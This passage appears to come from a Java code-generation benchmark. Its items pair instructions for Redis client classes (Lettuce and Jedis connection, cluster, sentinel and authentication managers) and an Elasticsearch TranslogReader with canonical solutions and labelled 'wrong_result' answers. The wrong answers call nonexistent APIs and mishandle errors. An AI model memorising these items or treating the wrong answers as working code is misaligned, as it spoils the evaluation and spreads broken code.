    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.codec.ByteArrayCodec;\nimport io.lettuce.core.ClientOptions;\nimport io.lettuce.core.TimeoutOptions;\nimport java.time.Duration;\nimport java.util.concurrent.TimeUnit;\n\npublic class RedisConnectionManager {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<byte[], byte[]> connection;\n\n    public void setupConnection(String host, int port) {\n        redisClient = RedisClient.create(RedisURI.create(host, port));\n        redisClient.setOptions(ClientOptions.builder()\n                .timeoutOptions(TimeoutOptions.builder().fixedTimeout(Duration.ofSeconds(10)).build()).build());\n        connection = redisClient.connect(ByteArrayCodec.INSTANCE);\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown(0, 0, TimeUnit.SECONDS);\n        }\n    }\n\n    public StatefulRedisConnection<byte[], byte[]> getConnection() {\n        return connection;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.RedisClientOptions;\nimport java.time.Duration;\nimport io.lettuce.core.api.StatefulRedisConnection;\n\npublic class RedisConnectionManager {\n    private RedisClient redisClient;\n    private StatefulRedisConnection<byte[], byte[]> connection;\n\n    public void setupConnection(String host, int port) {\n        RedisURI redisUri = RedisURI.create(host, port);\n        RedisClientOptions options = RedisClientOptions.builder()\n                .timeout(Duration.ofSeconds(10))\n                .build();\n        redisClient = RedisClient.create(redisUri, options);\n        connection = redisClient.connect();\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n\n    public StatefulRedisConnection<byte[], byte[]> getConnection() {\n        return connection;\n    }\n}"
  },
  {
    "Task_id": 314,
    "Instruction": "Task Description: Implement a Redis cluster connection provider in Java that manages connections to a Redis cluster, handles slot-based routing, and provides connection pooling functionality.\n\nClass Description: ClusterConnectionProvider is a connection management class for Redis clusters that maintains a cache of cluster nodes and slots, provides connections based on slot hashing, and handles connection failures with retry logic.\n\nAttributes:\n- cache: JedisClusterInfoCache - Maintains information about cluster nodes, slots, and connection pools\n\nMethods:\n- initializeSlotsCache(Set<HostAndPort>, JedisClientConfig) -> void - Initializes the cluster slots cache by connecting to seed nodes and discovering cluster topology\n- getConnection(CommandArguments) -> Connection - Retrieves a connection based on command arguments (slot-aware)\n- getConnection() -> Connection - Gets a random connection from available cluster nodes\n- getConnectionFromSlot(int) -> Connection - Gets a connection specifically for a given hash slot\n- renewSlotCache() -> void - Refreshes the cluster slots information\n- close() -> void - Closes all connections and releases resources\n- getConnectionMap() -> Map<String, ConnectionPool> - Returns an unmodifiable map of all node connections",
    "Canonical_solution": "import java.time.Duration;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Set;\nimport java.util.concurrent.ThreadLocalRandom;\n\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\n\nimport redis.clients.jedis.ClusterCommandArguments;\nimport redis.clients.jedis.CommandArguments;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.ConnectionPool;\nimport redis.clients.jedis.JedisClusterInfoCache;\nimport redis.clients.jedis.exceptions.JedisClusterOperationException;\nimport redis.clients.jedis.exceptions.JedisException;\n\npublic class ClusterConnectionProvider implements ConnectionProvider {\n\n  protected final JedisClusterInfoCache cache;\n\n  public ClusterConnectionProvider(Set<HostAndPort> clusterNodes, JedisClientConfig clientConfig) {\n    this.cache = new JedisClusterInfoCache(clientConfig, clusterNodes);\n    initializeSlotsCache(clusterNodes, clientConfig);\n  }\n\n  private void initializeSlotsCache(Set<HostAndPort> startNodes, JedisClientConfig clientConfig) {\n    if (startNodes.isEmpty()) {\n      throw new JedisClusterOperationException(\"No nodes to initialize cluster slots cache.\");\n    }\n\n    ArrayList<HostAndPort> startNodeList = new ArrayList<>(startNodes);\n    Collections.shuffle(startNodeList);\n\n    JedisException firstException = null;\n    for (HostAndPort hostAndPort : startNodeList) {\n      try (Connection jedis = new Connection(hostAndPort, clientConfig)) {\n        cache.discoverClusterNodesAndSlots(jedis);\n        return;\n      } catch (JedisException e) {\n        if (firstException == null) {\n          firstException = e;\n        }\n      }\n    }\n\n    JedisClusterOperationException uninitializedException\n        = new JedisClusterOperationException(\"Could not initialize cluster slots cache.\");\n    uninitializedException.addSuppressed(firstException);\n    throw uninitializedException;\n  }\n\n  @Override\n  public Connection getConnection(CommandArguments args) {\n    final int slot = ((ClusterCommandArguments) args).getCommandHashSlot();\n    return slot >= 0 ? getConnectionFromSlot(slot) : getConnection();\n  }\n\n  @Override\n  public Connection getConnection() {\n    List<ConnectionPool> pools = cache.getShuffledNodesPool();\n\n    JedisException suppressed = null;\n    for (ConnectionPool pool : pools) {\n      Connection jedis = null;\n      try {\n        jedis = pool.getResource();\n        if (jedis == null) {\n          continue;\n        }\n\n        jedis.ping();\n        return jedis;\n\n      } catch (JedisException ex) {\n        if (suppressed == null) {\n          suppressed = ex;\n        }\n        if (jedis != null) {\n          jedis.close();\n        }\n      }\n    }\n\n    JedisClusterOperationException noReachableNode = new JedisClusterOperationException(\"No reachable node in cluster.\");\n    if (suppressed != null) {\n      noReachableNode.addSuppressed(suppressed);\n    }\n    throw noReachableNode;\n  }\n\n  public Connection getConnectionFromSlot(int slot) {\n    ConnectionPool connectionPool = cache.getSlotPool(slot);\n    if (connectionPool != null) {\n      return connectionPool.getResource();\n    } else {\n      renewSlotCache();\n      connectionPool = cache.getSlotPool(slot);\n      if (connectionPool != null) {\n        return connectionPool.getResource();\n      } else {\n        return getConnection();\n      }\n    }\n  }\n\n  public void renewSlotCache() {\n    cache.renewClusterSlots(null);\n  }\n\n  @Override\n  public void close() {\n    cache.close();\n  }\n\n  @Override\n  public Map<String, ConnectionPool> getConnectionMap() {\n    return Collections.unmodifiableMap(cache.getNodes());\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class ClusterConnectionProvider {\n    private final JedisClusterInfoCache cache;\n\n    public ClusterConnectionProvider() {\n        this.cache = new JedisClusterInfoCache();\n    }\n\n    public void initializeSlotsCache(Set<HostAndPort> seedNodes, JedisClientConfig config) {\n        cache.initialize(seedNodes, config);\n    }\n\n    public Connection getConnection(CommandArguments args) {\n        int slot = getSlotFromCommand(args);\n        return getConnectionFromSlot(slot);\n    }\n\n    public Connection getConnection() {\n        HostAndPort randomNode = cache.getRandomNode();\n        return getConnectionFromNode(randomNode);\n    }\n\n    public Connection getConnectionFromSlot(int slot) {\n        HostAndPort node = cache.getNodeForSlot(slot);\n        return getConnectionFromNode(node);\n    }\n\n    private int getSlotFromCommand(CommandArguments args) {\n        String key = args.getKey();\n        return Jedis.computeHashSlot(key);\n    }\n\n    private Connection getConnectionFromNode(HostAndPort node) {\n        ConnectionPool pool = cache.getConnectionPool(node);\n        Jedis jedis = pool.getResource();\n        return new Connection(jedis);\n    }\n\n    public void renewSlotCache() {\n        cache.renew();\n    }\n\n    public void close() {\n        cache.close();\n    }\n\n    public Map<String, ConnectionPool> getConnectionMap() {\n        return Collections.unmodifiableMap(cache.getConnectionPools());\n    }\n}"
  },
  {
    "Task_id": 315,
    "Instruction": "Task Description: Implement a Redis connection class in Java that handles socket communication, authentication, and basic Redis operations while managing connection state and resources.\n\nClass Description: The Connection class represents a Redis client connection that manages socket communication with a Redis server. It handles connection establishment, command sending, response reading, and connection cleanup. The class implements Closeable for proper resource management.\n\nAttributes:\n- socketFactory: JedisSocketFactory - Factory for creating socket connections to Redis\n- socket: Socket - The underlying socket connection to Redis\n- outputStream: RedisOutputStream - Output stream for sending commands to Redis\n- inputStream: RedisInputStream - Input stream for reading responses from Redis\n- soTimeout: int - Socket timeout setting\n- broken: boolean - Flag indicating if the connection is in a broken state\n- currentCredentials: AtomicReference<RedisCredentials> - Current authentication credentials\n- authXManager: AuthXManager - Manager for authentication operations\n\nMethods:\n- Connection(JedisSocketFactory) -> void - Constructor that initializes with a socket factory\n- connect() -> void - Establishes connection to Redis server\n- disconnect() -> void - Closes the connection to Redis server\n- isConnected() -> boolean - Checks if connection is active\n- isBroken() -> boolean - Checks if connection is in broken state\n- setBroken() -> void - Marks connection as broken\n- sendCommand(ProtocolCommand, byte[]...) -> void - Sends a Redis command with arguments\n- getOne() -> Object - Reads and returns a single response from Redis\n- flush() -> void - Flushes the output stream\n- readProtocolWithCheckingBroken() -> Object - Reads protocol response while checking connection state\n- close() -> void - Implements Closeable interface to disconnect (alias for disconnect)",
    "Canonical_solution": "import java.io.Closeable;\nimport java.io.IOException;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.Arrays;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicReference;\n\nimport redis.clients.jedis.Protocol;\nimport redis.clients.jedis.Protocol.Command;\nimport redis.clients.jedis.Protocol.Keyword;\nimport redis.clients.jedis.args.Rawable;\nimport redis.clients.jedis.authentication.AuthXManager;\nimport redis.clients.jedis.commands.ProtocolCommand;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisDataException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport redis.clients.jedis.util.IOUtils;\nimport redis.clients.jedis.util.RedisInputStream;\nimport redis.clients.jedis.util.RedisOutputStream;\n\npublic class Connection implements Closeable {\n\n  private final JedisSocketFactory socketFactory;\n  private Socket socket;\n  private RedisOutputStream outputStream;\n  private RedisInputStream inputStream;\n  private int soTimeout = 0;\n  private boolean broken = false;\n  private AtomicReference<RedisCredentials> currentCredentials = new AtomicReference<>(null);\n  private AuthXManager authXManager;\n\n  public Connection(final JedisSocketFactory socketFactory) {\n    this.socketFactory = socketFactory;\n  }\n\n  public void connect() throws JedisConnectionException {\n    if (!isConnected()) {\n      try {\n        socket = socketFactory.createSocket();\n        outputStream = new RedisOutputStream(socket.getOutputStream());\n        inputStream = new RedisInputStream(socket.getInputStream());\n        broken = false;\n      } catch (JedisConnectionException jce) {\n        setBroken();\n        throw jce;\n      } catch (IOException ioe) {\n        setBroken();\n        throw new JedisConnectionException(\"Failed to create input/output stream\", ioe);\n      } finally {\n        if (broken) {\n          IOUtils.closeQuietly(socket);\n        }\n      }\n    }\n  }\n\n  public void disconnect() {\n    if (isConnected()) {\n      try {\n        outputStream.flush();\n        socket.close();\n      } catch (IOException ex) {\n        throw new JedisConnectionException(ex);\n      } finally {\n        IOUtils.closeQuietly(socket);\n        setBroken();\n      }\n    }\n  }\n\n  public boolean isConnected() {\n    return socket != null && socket.isBound() && !socket.isClosed() && socket.isConnected()\n        && !socket.isInputShutdown() && !socket.isOutputShutdown();\n  }\n\n  public boolean isBroken() {\n    return broken;\n  }\n\n  public void setBroken() {\n    broken = true;\n  }\n\n  public void sendCommand(final ProtocolCommand cmd, final byte[]... args) {\n    try {\n      connect();\n      Protocol.sendCommand(outputStream, new CommandArguments(cmd).addObjects((Object[]) args));\n    } catch (JedisConnectionException ex) {\n      setBroken();\n      throw ex;\n    }\n  }\n\n  public Object getOne() {\n    flush();\n    return readProtocolWithCheckingBroken();\n  }\n\n  protected void flush() {\n    try {\n      outputStream.flush();\n    } catch (IOException ex) {\n      setBroken();\n      throw new JedisConnectionException(ex);\n    }\n  }\n\n  protected Object readProtocolWithCheckingBroken() {\n    if (broken) {\n      throw new JedisConnectionException(\"Attempting to read from a broken connection.\");\n    }\n    try {\n      return Protocol.read(inputStream);\n    } catch (JedisConnectionException exc) {\n      broken = true;\n      throw exc;\n    }\n  }\n\n  @Override\n  public void close() {\n    disconnect();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class Connection implements Closeable {\n    private final JedisSocketFactory socketFactory;\n    private Socket socket;\n    private RedisOutputStream outputStream;\n    private RedisInputStream inputStream;\n    private final int soTimeout;\n    private boolean broken;\n    private final AtomicReference<RedisCredentials> currentCredentials;\n    private final AuthXManager authXManager;\n\n    public Connection(JedisSocketFactory socketFactory) {\n        this.socketFactory = socketFactory;\n        this.soTimeout = 2000;\n        this.broken = false;\n        this.currentCredentials = new AtomicReference<>();\n        this.authXManager = new AuthXManager();\n    }\n\n    public void connect() {\n        if (socket == null || !socket.isConnected()) {\n            try {\n                socket = socketFactory.createSocket();\n                socket.setSoTimeout(soTimeout);\n                outputStream = new RedisOutputStream(socket.getOutputStream());\n                inputStream = new RedisInputStream(socket.getInputStream());\n                if (currentCredentials.get() != null) {\n                    authXManager.auth(currentCredentials.get(), this);\n                }\n            } catch (Exception e) {\n                setBroken();\n            }\n        }\n    }\n\n    public void disconnect() {\n        if (socket != null) {\n            try {\n                socket.close();\n            } catch (IOException e) {\n            }\n            socket = null;\n            broken = true;\n        }\n    }\n\n    public boolean isConnected() {\n        return socket != null && socket.isConnected();\n    }\n\n    public boolean isBroken() {\n        return broken;\n    }\n\n    public void setBroken() {\n        broken = true;\n    }\n\n    public void sendCommand(ProtocolCommand command, byte[]... args) {\n        if (isBroken()) {\n            throw new IllegalStateException(\"Connection is broken\");\n        }\n        outputStream.writeCommand(command, args);\n        outputStream.flush();\n    }\n\n    public Object getOne() {\n        return readProtocolWithCheckingBroken();\n    }\n\n    public void flush() {\n        outputStream.flush();\n    }\n\n    public Object readProtocolWithCheckingBroken() {\n        if (isBroken()) {\n            throw new IllegalStateException(\"Connection is broken\");\n        }\n        return inputStream.read();\n    }\n\n    @Override\n    public void close() {\n        disconnect();\n    }\n}"
  },
  {
    "Task_id": 316,
    "Instruction": "Task Description: Implement a Redis Sentinel-based connection provider in Java that can discover and connect to the current Redis master node through Sentinel servers.\n\nClass Description: SentineledConnectionProvider is a utility class that manages Redis connections in a Sentinel environment. It discovers the current master node through Sentinel servers and establishes connections to it.\n\nAttributes:\n- masterName: String - The name of the Redis master node as configured in Sentinel\n- masterConfig: JedisClientConfig - Configuration for connecting to the Redis master\n- sentinels: Set<HostAndPort> - Set of Sentinel server addresses (host and port)\n- sentinelConfig: JedisClientConfig - Configuration for connecting to Sentinel servers\n\nMethods:\n- getConnection() -> Connection - Discovers the current master node through Sentinel and returns an established connection to it\n- discoverMaster() -> HostAndPort - Internal method that queries Sentinel servers to find the current master node's address\n- close() -> void - Cleans up any resources (currently a placeholder for future implementation)\n\nInput: \n- Constructor parameters:\n  - masterName: String\n  - masterConfig: JedisClientConfig\n  - sentinels: Set<HostAndPort>\n  - sentinelConfig: JedisClientConfig\n\nOutput:\n- getConnection() returns a connected Connection object to the current Redis master\n- discoverMaster() returns the HostAndPort of the current master node\n- close() has no return value",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport java.util.Set;\nimport java.util.HashSet;\n\npublic class SentineledConnectionProvider {\n\n    private final String masterName;\n    private final JedisClientConfig masterConfig;\n    private final Set<HostAndPort> sentinels;\n    private final JedisClientConfig sentinelConfig;\n\n    public SentineledConnectionProvider(String masterName, JedisClientConfig masterConfig,\n                                      Set<HostAndPort> sentinels, JedisClientConfig sentinelConfig) {\n        this.masterName = masterName;\n        this.masterConfig = masterConfig;\n        this.sentinels = sentinels;\n        this.sentinelConfig = sentinelConfig;\n    }\n\n    public Connection getConnection() {\n        try {\n            HostAndPort master = discoverMaster();\n            Connection connection = new Connection(master, masterConfig);\n            connection.connect();\n            return connection;\n        } catch (JedisException e) {\n            throw new JedisConnectionException(\"Failed to get connection from sentinel\", e);\n        }\n    }\n\n    private HostAndPort discoverMaster() {\n        for (HostAndPort sentinel : sentinels) {\n            try (Jedis jedis = new Jedis(sentinel, sentinelConfig)) {\n                String masterHost = jedis.sentinelGetMasterAddrByName(masterName).get(0);\n                int masterPort = Integer.parseInt(jedis.sentinelGetMasterAddrByName(masterName).get(1));\n                return new HostAndPort(masterHost, masterPort);\n            } catch (Exception e) {\n                continue;\n            }\n        }\n        throw new JedisException(\"Could not discover master from sentinels\");\n    }\n\n    public void close() {\n        // Cleanup resources if needed\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class SentineledConnectionProvider {\n    private final String masterName;\n    private final JedisClientConfig masterConfig;\n    private final Set<HostAndPort> sentinels;\n    private final JedisClientConfig sentinelConfig;\n\n    public SentineledConnectionProvider(String masterName, JedisClientConfig masterConfig, \n                                        Set<HostAndPort> sentinels, JedisClientConfig sentinelConfig) {\n        this.masterName = masterName;\n        this.masterConfig = masterConfig;\n        this.sentinels = sentinels;\n        this.sentinelConfig = sentinelConfig;\n    }\n\n    public Connection getConnection() {\n        HostAndPort master = discoverMaster();\n        Jedis jedis = new Jedis(\n            master.getHost(), \n            master.getPort(), \n            masterConfig.getConnectionTimeout(), \n            masterConfig.getSoTimeout(), \n            masterConfig.getPassword()\n        );\n        return jedis;\n    }\n\n    private HostAndPort discoverMaster() {\n        for (HostAndPort sentinel : sentinels) {\n            try (Jedis jedis = new Jedis(\n                sentinel.getHost(), \n                sentinel.getPort(), \n                sentinelConfig.getConnectionTimeout(), \n                sentinelConfig.getSoTimeout()\n            )) {\n                List<String> masterAddr = jedis.sentinel(\"get-master-addr-by-name\", masterName);\n                if (masterAddr != null && masterAddr.size() >= 2) {\n                    String host = masterAddr.get(0);\n                    int port = Integer.parseInt(masterAddr.get(1));\n                    return new HostAndPort(host, port);\n                }\n            } catch (Exception e) {\n                // Log the exception if needed\n            }\n        }\n        throw new RuntimeException(\"No master found by Sentinel\");\n    }\n\n    public void close() {\n        // Placeholder for future implementation\n    }\n}"
  },
  {
    "Task_id": 319,
    "Instruction": "Task Description: Create a singleton Redis client class that manages a single Redis connection instance throughout the application lifecycle, with automatic shutdown handling.\n\nClass Description: DefaultRedisClient is a singleton class that provides centralized Redis client management. It creates and maintains a single RedisClient instance, configures default timeout settings, and ensures proper resource cleanup during JVM shutdown.\n\nAttributes:\n- instance: DefaultRedisClient - The singleton instance of the class\n- redisClient: RedisClient - The underlying Redis client connection instance\n\nMethods:\n- get() -> RedisClient - Returns the singleton RedisClient instance after setting a default timeout of 60 seconds\n- DefaultRedisClient() (constructor) - Private constructor that initializes the RedisClient with connection settings and registers a shutdown hook\n- run() (in anonymous Thread class) - Shutdown hook method that cleans up Redis client resources during JVM shutdown",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.test.settings.TestSettings;\nimport java.util.concurrent.TimeUnit;\n\npublic class DefaultRedisClient {\n\n    private static final DefaultRedisClient instance = new DefaultRedisClient();\n\n    private RedisClient redisClient;\n\n    private DefaultRedisClient() {\n        redisClient = RedisClient.create(RedisURI.Builder.redis(TestSettings.host(), TestSettings.port()).build());\n        Runtime.getRuntime().addShutdownHook(new Thread() {\n            @Override\n            public void run() {\n                FastShutdown.shutdown(redisClient);\n            }\n        });\n    }\n\n    public static RedisClient get() {\n        instance.redisClient.setDefaultTimeout(60, TimeUnit.SECONDS);\n        return instance.redisClient;\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class DefaultRedisClient {\n    private static DefaultRedisClient instance;\n    private RedisClient redisClient;\n\n    private DefaultRedisClient() {\n        redisClient = RedisClient.create(\"redis://localhost:6379\");\n        redisClient.setTimeout(60_000);\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            this.run();\n        }));\n    }\n\n    public static DefaultRedisClient get() {\n        if (instance == null) {\n            instance = new DefaultRedisClient();\n        }\n        return instance;\n    }\n\n    private void run() {\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n\n    public RedisClient getRedisClient() {\n        return redisClient;\n    }\n}"
  },
  {
    "Task_id": 32,
    "Instruction": "Task Description: Implement a TranslogReader class that handles reading operations from a transaction log (translog) file in Elasticsearch, including managing file channels, checkpoints, and ensuring thread-safe operations.\n\nClass Description: The TranslogReader class extends BaseTranslogReader and implements Closeable, providing functionality to read from a translog file while maintaining checkpoint information and ensuring proper resource management. It handles file channel operations, checkpoint updates, and provides thread-safe closing mechanisms.\n\nAttributes:\n- length: long - The length of the translog file in bytes.\n- totalOperations: int - The total number of operations recorded in the translog.\n- checkpoint: Checkpoint - The checkpoint information containing metadata about the translog state.\n- closed: AtomicBoolean - Thread-safe flag indicating whether the reader is closed.\n\nMethods:\n- TranslogReader(Checkpoint, FileChannel, Path, TranslogHeader) -> [Constructor] - Initializes a new TranslogReader with the given checkpoint, file channel, path, and translog header.\n- open(FileChannel, Path, Checkpoint, String) -> TranslogReader - Static method to open and initialize a TranslogReader instance with the specified parameters.\n- closeIntoTrimmedReader(long, ChannelFactory) -> TranslogReader - Closes the current reader and returns a new trimmed reader based on the specified sequence number, updating the checkpoint if necessary.\n- readBytes(ByteBuffer, long) -> void - Reads bytes from the translog file into the provided buffer at the specified position, with bounds checking.\n- close() -> void - Closes the file channel and marks the reader as closed in a thread-safe manner.\n- isClosed() -> boolean - Returns whether the reader is closed.\n- ensureOpen() -> void - Throws an AlreadyClosedException if the reader is closed.",
    "Canonical_solution": "import org.apache.lucene.store.AlreadyClosedException;\nimport org.elasticsearch.common.io.Channels;\nimport io.crate.common.io.IOUtils;\nimport org.elasticsearch.index.seqno.SequenceNumbers;\n\nimport java.io.Closeable;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\nimport static org.elasticsearch.index.translog.Translog.getCommitCheckpointFileName;\n\npublic class TranslogReader extends BaseTranslogReader implements Closeable {\n    protected final long length;\n    private final int totalOperations;\n    private final Checkpoint checkpoint;\n    protected final AtomicBoolean closed = new AtomicBoolean(false);\n\n    TranslogReader(final Checkpoint checkpoint, final FileChannel channel, final Path path, final TranslogHeader header) {\n        super(checkpoint.generation, channel, path, header);\n        this.length = checkpoint.offset;\n        this.totalOperations = checkpoint.numOps;\n        this.checkpoint = checkpoint;\n    }\n\n    public static TranslogReader open(\n            final FileChannel channel, final Path path, final Checkpoint checkpoint, final String translogUUID) throws IOException {\n        final TranslogHeader header = TranslogHeader.read(translogUUID, path, channel);\n        return new TranslogReader(checkpoint, channel, path, header);\n    }\n\n    TranslogReader closeIntoTrimmedReader(long aboveSeqNo, ChannelFactory channelFactory) throws IOException {\n        if (closed.compareAndSet(false, true)) {\n            Closeable toCloseOnFailure = channel;\n            final TranslogReader newReader;\n            try {\n                if (aboveSeqNo < checkpoint.trimmedAboveSeqNo\n                    || aboveSeqNo < checkpoint.maxSeqNo && checkpoint.trimmedAboveSeqNo == SequenceNumbers.UNASSIGNED_SEQ_NO) {\n                    final Path checkpointFile = path.getParent().resolve(getCommitCheckpointFileName(checkpoint.generation));\n                    final Checkpoint newCheckpoint = new Checkpoint(checkpoint.offset, checkpoint.numOps,\n                        checkpoint.generation, checkpoint.minSeqNo, checkpoint.maxSeqNo,\n                        checkpoint.globalCheckpoint, checkpoint.minTranslogGeneration, aboveSeqNo);\n                    Checkpoint.write(channelFactory, checkpointFile, newCheckpoint, StandardOpenOption.WRITE);\n\n                    IOUtils.fsync(checkpointFile, false);\n                    IOUtils.fsync(checkpointFile.getParent(), true);\n\n                    newReader = new TranslogReader(newCheckpoint, channel, path, header);\n                } else {\n                    newReader = new TranslogReader(checkpoint, channel, path, header);\n                }\n                toCloseOnFailure = null;\n                return newReader;\n            } finally {\n                IOUtils.close(toCloseOnFailure);\n            }\n        } else {\n            throw new AlreadyClosedException(toString() + \" is already closed\");\n        }\n    }\n\n    protected void readBytes(ByteBuffer buffer, long position) throws IOException {\n        if (position >= length) {\n            throw new EOFException(\"read requested past EOF. pos [\" + position + \"] end: [\" + length + \"]\");\n        }\n        if (position < getFirstOperationOffset()) {\n            throw new IOException(\"read requested before position of first ops. pos [\" + position + \"] first op on: [\" + getFirstOperationOffset() + \"]\");\n        }\n        Channels.readFromFileChannelWithEofException(channel, position, buffer);\n    }\n\n    @Override\n    public final void close() throws IOException {\n        if (closed.compareAndSet(false, true)) {\n            channel.close();\n        }\n    }\n\n    protected final boolean isClosed() {\n        return closed.get();\n    }\n\n    protected void ensureOpen() {\n        if (isClosed()) {\n            throw new AlreadyClosedException(toString() + \" is already closed\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class TranslogReader extends BaseTranslogReader implements Closeable {\n    private final long length;\n    private final int totalOperations;\n    private final Checkpoint checkpoint;\n    private final AtomicBoolean closed;\n    private final FileChannel fileChannel;\n    private final Path path;\n    private final TranslogHeader translogHeader;\n\n    public TranslogReader(Checkpoint checkpoint, FileChannel fileChannel, Path path, TranslogHeader translogHeader) {\n        this.checkpoint = checkpoint;\n        this.fileChannel = fileChannel;\n        this.path = path;\n        this.translogHeader = translogHeader;\n        this.length = fileChannel.size();\n        this.totalOperations = translogHeader.getTotalOperations();\n        this.closed = new AtomicBoolean(false);\n    }\n\n    public static TranslogReader open(FileChannel fileChannel, Path path, Checkpoint checkpoint, String... args) {\n        TranslogHeader header = parseHeader(fileChannel, path, args);\n        return new TranslogReader(checkpoint, fileChannel, path, header);\n    }\n\n    public TranslogReader closeIntoTrimmedReader(long sequenceNumber, ChannelFactory channelFactory) {\n        ensureOpen();\n        if (sequenceNumber < 0) {\n            throw new IllegalArgumentException(\"Sequence number cannot be negative\");\n        }\n        Checkpoint newCheckpoint = new Checkpoint(sequenceNumber, checkpoint.getOtherFields());\n        fileChannel.close();\n        FileChannel newFileChannel = channelFactory.createFileChannel(path);\n        TranslogReader trimmedReader = new TranslogReader(newCheckpoint, newFileChannel, path, translogHeader);\n        closed.set(true);\n        return trimmedReader;\n    }\n\n    public void readBytes(ByteBuffer buffer, long position) {\n        ensureOpen();\n        if (position < 0 || position > length) {\n            throw new IllegalArgumentException(\"Position out of bounds\");\n        }\n        if (buffer.remaining() > length - position) {\n            throw new IllegalArgumentException(\"Buffer too large\");\n        }\n        try {\n            fileChannel.read(buffer, position);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to read from translog\", e);\n        }\n    }\n\n    @Override\n    public void close() {\n        if (closed.compareAndSet(false, true)) {\n            try {\n                fileChannel.close();\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n    }\n\n    public boolean isClosed() {\n        return closed.get();\n    }\n\n    public void ensureOpen() {\n        if (closed.get()) {\n            throw new AlreadyClosedException(\"TranslogReader is closed\");\n        }\n    }\n\n    private static TranslogHeader parseHeader(FileChannel fileChannel, Path path, String... args) {\n        // Implementation to parse translog header\n        return new TranslogHeader();\n    }\n}"
  },
  {
    "Task_id": 320,
    "Instruction": "Task Description: Create a Java class that manages authentication and operations for a Redis cluster using Jedis client library, with support for token-based authentication and connection pooling.\n\nClass Description: RedisClusterAuthManager is a class that handles Redis cluster authentication and operations. It provides methods to execute basic Redis operations and test re-authentication functionality in a multi-threaded environment.\n\nAttributes:\n- idpConfig: [IdentityProviderConfig] - Configuration for the identity provider that generates authentication tokens\n- authXManager: [AuthXManager] - Manager responsible for handling authentication processes\n- config: [JedisClientConfig] - Configuration for the Jedis client\n- poolConfig: [ConnectionPoolConfig] - Configuration for the connection pool\n- hostAndPort: [HostAndPort] - Redis cluster endpoint information\n\nMethods:\n- RedisClusterAuthManager([HostAndPort hostAndPort]) -> [void] - Constructor that initializes the authentication manager with Redis cluster endpoint\n- executeRedisOperations() -> [void] - Executes basic Redis operations (set, get, delete) on the cluster\n- testReAuthentication() -> [void] - Tests re-authentication functionality in a multi-threaded environment, verifying that connections properly re-authenticate",
    "Canonical_solution": "import redis.clients.authentication.core.IdentityProvider;\nimport redis.clients.authentication.core.IdentityProviderConfig;\nimport redis.clients.authentication.core.SimpleToken;\nimport redis.clients.authentication.core.Token;\nimport redis.clients.authentication.entraid.EntraIDTokenAuthConfigBuilder;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.ConnectionPoolConfig;\nimport redis.clients.jedis.DefaultJedisClientConfig;\nimport redis.clients.jedis.EndpointConfig;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.JedisCluster;\n\npublic class RedisClusterAuthManager {\n\n    private final IdentityProviderConfig idpConfig;\n    private final AuthXManager authXManager;\n    private final JedisClientConfig config;\n    private final ConnectionPoolConfig poolConfig;\n    private final HostAndPort hostAndPort;\n\n    public RedisClusterAuthManager(HostAndPort hostAndPort) {\n        this.hostAndPort = hostAndPort;\n        this.idpConfig = new IdentityProviderConfig() {\n            @Override\n            public IdentityProvider getProvider() {\n                return new IdentityProvider() {\n                    @Override\n                    public Token requestToken() {\n                        return new SimpleToken(\"default\", \"cluster\",\n                                System.currentTimeMillis() + 5 * 1000, System.currentTimeMillis(),\n                                null);\n                    }\n                };\n            }\n        };\n        this.authXManager = new AuthXManager(EntraIDTokenAuthConfigBuilder.builder()\n                .lowerRefreshBoundMillis(1000).identityProviderConfig(idpConfig).build());\n        this.config = DefaultJedisClientConfig.builder().authXManager(authXManager).build();\n        this.poolConfig = new ConnectionPoolConfig();\n    }\n\n    public void executeRedisOperations() {\n        try (JedisCluster jc = new JedisCluster(hostAndPort, config, 5, poolConfig)) {\n            jc.set(\"foo\", \"bar\");\n            jc.get(\"foo\");\n            jc.del(\"foo\");\n        }\n    }\n\n    public void testReAuthentication() throws InterruptedException, ExecutionException {\n        AuthXManager 